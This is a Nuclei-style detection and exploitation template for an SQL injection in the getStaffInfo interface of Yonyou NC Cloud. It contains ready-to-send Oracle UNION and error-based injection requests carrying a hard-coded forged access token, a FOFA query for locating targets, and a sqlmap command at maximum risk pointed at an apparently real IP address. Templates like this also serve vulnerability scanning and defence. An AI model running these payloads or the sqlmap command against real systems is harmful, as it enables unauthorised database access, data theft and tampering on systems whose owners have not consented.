id: yonyou-nc-cloud-getStaffInfo-sqli

info:
  name: 用友 NC Cloud getStaffInfo - sqli
  author: leadlife
  severity: high
  description: 用友NC-Cloud系统getStaffInfo接口存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全
  reference:
      - https://github.com/wjlin0/poc-doc/blob/b64c0483e686f89dde1cbf7d6fa3fc7271ef16ba/docs/wy876_poc/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BNC-Cloud%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3getStaffInfo%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:   
    verified: true
    fofa-query: app="用友-NC-Cloud"
    sqlmap: sqlmap -u "http://59.110.60.228/ncchr/attendstaff/getStaffInfo?id=*" --level 5 --tamper=space2comment --risk 3 --batch --dbms=oracle --ignore-code 401 --technique=ET
    tips: sqlmap 跑不出来一般是有 waf，如果 sqlmap 爆 401 则不考虑该漏洞
  tags: sqli,yonyou,nccloud,oa,2024

http:
  - raw:
      - |
        GET /ncchr/attendstaff/getStaffInfo?id={{url_encode("1\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(113)||CHR(113)||CHR(107)||CHR(113)||NVL(CAST(111*111 AS VARCHAR(4000)),CHR(32))||CHR(113)||CHR(106)||CHR(106)||CHR(118)||CHR(113),NULL,NULL,NULL,NULL,NULL FROM DUAL-- zhXX")}} HTTP/1.1
        Host: {{Hostname}}
        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
    
    matchers:
      - type: dsl
        name: payload_1
        dsl:
          - status_code == 200
          - contains(body,"12321")
        condition: and

  - raw:
      - |
        GET /ncchr/attendstaff/getStaffInfo?id=1%27%29+AND+2787%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%282787%3D2787%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+gPZR HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
  
    matchers-condition: or
    matchers:
      - type: dsl
        name: payload_2
        dsl:
          - status_code == 500
          - contains_all(body,"message",'class')
        condition: and

      - type: dsl
        name: payload_2_bind
        dsl:
          - status_code == 500
          - contains(body,"qzzzq1qzq")
        condition: and

          